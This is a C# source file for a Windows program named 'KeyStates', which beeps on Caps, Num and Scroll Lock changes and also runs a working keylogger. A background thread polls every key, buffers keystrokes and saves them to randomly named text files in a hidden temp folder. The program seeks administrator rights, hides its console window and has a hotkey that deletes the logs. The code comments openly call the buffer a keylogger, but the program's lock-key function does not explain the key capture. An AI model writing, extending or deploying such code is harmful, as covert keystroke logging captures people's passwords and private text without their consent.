/*
 6-19-2024
 KeyStates W.I.P
 domer/PeripheralVisionPD2
*/

using KeyStates;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

new Utils().OnStart(); // start program

namespace KeyStates
{
    public struct LogCache
    {
        public string data;
    }

    public struct KeyCache
    {
        public bool Caps;
        public bool Num;
        public bool Scroll;
    }

    internal class Utils
    {
        // static data //
        private static readonly int SW_HIDE = 0;

        private static readonly int SW_SHOW = 5;
        private static readonly ushort[] KeyArr = [0x14, 0x90, 0x91]; // caps, num, scroll
        private static readonly int ShfKey = 0x10;
        private static readonly int ConHide = 0x75;   // f6
        private static readonly int KillKey = 0x77;   // f8
        // end section//

        // editable data //
        private bool ConStat = true;

        private bool EmrKill = false;
        private bool ConIntr = false;
        private string TmpPath = "";
        private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
        private LogCache LogHolder;                     // keylogger input buffer

        private enum DbgMsgTypes : int
        {
            Default = 0,
            Error = 1
        }

        // end section //

        // dll imports section //

        /* [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AttachConsole(uint dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool FreeConsole();/* /*left over dbg crap*/

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern bool MessageBeep(uint uType);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        // end section //

        // program main functions //
        private static string SecureRandomString(int length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                var bytes = new byte[length];
                rng.GetBytes(bytes);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
            }
        }

        private void DestroyLog()
        {
            TglCon(true);
            if (Directory.Exists(TmpPath))
            {
                IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath);
                foreach (string ExistFile in ExistFiles)
                    DbgMsg(ExistFile);
                Directory.Delete(TmpPath, true);
                DbgMsg("folder deleted");
                EmrKill = true;
            }
            return;
        }

        private void LoopKeys()
        {
            DbgMsg("keylog thread started");
            int x = 0;
            while (true)
            {
                if (EmrKill)
                    return;
                for (int i = 0; i < 256; i++)
                {
                    bool LwUp = false;
                    if (GetAsyncKeyState(ShfKey) == 0) // check to see if the user is holding shift
                    {
                        LwUp = true;
                    }
                    if (GetAsyncKeyState(i) != 0)
                    {
                        char key = (char)i;
                        if (ConIntr && i == 0x59)
                        {
                            IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath);
                            foreach (string ExistFile in ExistFiles)
                                DbgMsg(ExistFile);
                            Directory.Delete(TmpPath, true);
                            DbgMsg("folder deleted");
                            EmrKill = true;
                        }
                        if (key == ConHide)     // f6 key to toggle dbg console
                            TglCon();
                        if (i == KillKey)    // f8 to kill program and delete all files
                            DestroyLog();
                        if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
                            break;
                        if (LwUp == false || StateHolder.Caps == true)  // if the user is holding shift or caps lock is on, print the output character in uppercase, else print in lowercase
                        {
                            // Console.Write(key.ToString().ToUpper()); // dbg junk code
                            LogHolder.data += key.ToString().ToUpper();
                        }
                        else
                        {
                            // Console.Write(key.ToString().ToLower()); // dbg junk code
                            LogHolder.data += key.ToString().ToLower();
                        }
                        break;
                    }
                    x++;
                }
                if (x >= 300000 && LogHolder.data.Length > 25)
                {
                    // Console.Clear(); // dbg junk code
                    String TmpFln = SecureRandomString(6);
                    File.WriteAllText($"{TmpPath}/" + TmpFln + ".txt", LogHolder.data.Replace("\u0001", " "));
                    LogHolder.data = "";
                    DbgMsg($"dumped keylog cache to {TmpFln}.txt", DbgMsgTypes.Default, true);
                    x = 0;
                }
                Thread.Sleep(88);   // delay to prevent repeating characters //
            }
        }

        private void DbgMsg(String input, DbgMsgTypes type = DbgMsgTypes.Default, bool timestamp = false)
        {
            if (ConStat == false || !IsDebug())
                return;
            string formattedTimestamp = DateTimeOffset.Now.ToString("yyyyMMddHHmmss");
            switch (type)
            {
                case DbgMsgTypes.Default:
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    if (timestamp)
                        Console.Write($"[{formattedTimestamp}] ");
                    Console.Write("[DBG]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;

                case DbgMsgTypes.Error:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"[!] {formattedTimestamp} [ERR]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
            }
        }

        private static bool IsDebug()
        {
#if DEBUG
            return true;
#endif
            return false;
        }

        private void TglCon(bool ForceShow = false)
        {
            // int ProcId = Process.GetCurrentProcess().Id; // dbg junk code
            if (ConStat)
            {
                if (ForceShow)
                {
                    ShowWindow(GetConsoleWindow(), SW_SHOW);
                    ConStat = true;
                    DbgMsg("forced show console");
                    return;
                }
                DbgMsg("console hidden");
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                ConStat = false;
                return;
            }
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            ConStat = true;
            DbgMsg("console restored");
            return;
        }

        private static bool CheckTglState(int index)
        {
            return (((ushort)GetKeyState(KeyArr[index])) & 0xffff) != 0;
        }

        private void InitCache()
        {
            DbgMsg("initial cache set");
            StateHolder.Caps = CheckTglState(0);
            StateHolder.Num = CheckTglState(1);
            StateHolder.Scroll = CheckTglState(2);
        }

        private static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void CheckDir()
        {
            if (TmpPath == "")
            {
                TmpPath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), SecureRandomString(10));
                DbgMsg("tmp path set to " + TmpPath);
            }
            if (!Directory.Exists(TmpPath))
            {
                Directory.CreateDirectory(TmpPath);
            }
        }

        private void UpdateCache()
        {
            int i = 0;
            foreach (var key in KeyArr)
            {
                switch (i)
                {
                    case 0:
                        if (CheckTglState(i) == StateHolder.Caps)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Caps = CheckTglState(i);
                        DbgMsg("CAPSLK " + StateHolder.Caps);
                        break;

                    case 1:
                        if (CheckTglState(i) == StateHolder.Num)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Num = CheckTglState(i);
                        DbgMsg("NUMLK " + StateHolder.Num);
                        break;

                    case 2:
                        if (CheckTglState(i) == StateHolder.Scroll)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Scroll = CheckTglState(i);
                        DbgMsg("SCRLK " + StateHolder.Scroll);
                        break;
                }
                i++;
            }
        }

        private static void ElevateProg()
        {
            ProcessStartInfo startInfo = new("KeyStates.exe");
            startInfo.UseShellExecute = true;
            startInfo.Verb = "runas";
            Process.Start(startInfo);
        }

        private void LogKeys()
        {
            DbgMsg("keytgl thread started");
            while (true)
            {
                if (ConIntr)
                    break;
                if (EmrKill)
                    return;
                UpdateCache();
                Thread.Sleep(200);
            }
        }

        private static bool ShowConfirmation(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write($"{message} (Y/N): ");
            char response = Console.ReadKey().KeyChar;
            return response == 'Y' || response == 'y';
        }

        public void OnStart()
        {
            if (!IsAdministrator())
            {
                bool continueProgram = ShowConfirmation("[!] program needs administrator permissions, relaunch as admin?");
                if (continueProgram)
                {
                    ElevateProg();
                }
                else
                {
                    return;
                }
                return;
            }
            else
                DbgMsg("succesfully launched with admin");

            TglCon(true);
            DbgMsg("OnStart called");
            CheckDir();
            InitCache();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("/* 6 - 19 - 2024");
            Console.WriteLine("   KeyStates W.I.P");
            Console.WriteLine("   domer/PeripheralVisionPD2 */");
            Console.ForegroundColor = ConsoleColor.White;
            Thread KeyLogLoop = new(LoopKeys);
            Thread TglKeyLoop = new(LogKeys);
            KeyLogLoop.Start();
            TglKeyLoop.Start();
        }

        // end section //
    }
}